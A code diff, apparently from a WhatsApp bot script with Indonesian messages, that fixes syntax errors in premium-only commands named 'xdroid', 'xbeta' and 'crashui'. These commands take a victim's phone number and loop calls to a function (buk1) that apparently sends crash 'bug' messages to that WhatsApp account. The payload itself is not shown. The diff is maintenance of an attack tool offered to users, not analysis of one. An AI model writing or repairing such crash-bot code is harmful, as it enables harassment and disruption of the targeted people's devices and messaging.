@@ -2134,16 +2134,12 @@ reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Vi
 break
 
 case 'xdroid': case 'xbeta': case 'crashui': 
-if (!isPremium) {
-return reply(mess.only.premium);
-}
-if (!q) return {
-reply(`Example: ${prefix + command} 62×××`);
-}
+if (!isPremium) return reply(mess.only.premium);
+if (!q) return reply(`Example: ${prefix + command} 62×××`);
 
-let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   
-reply(bugres):
+reply(bugres);
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
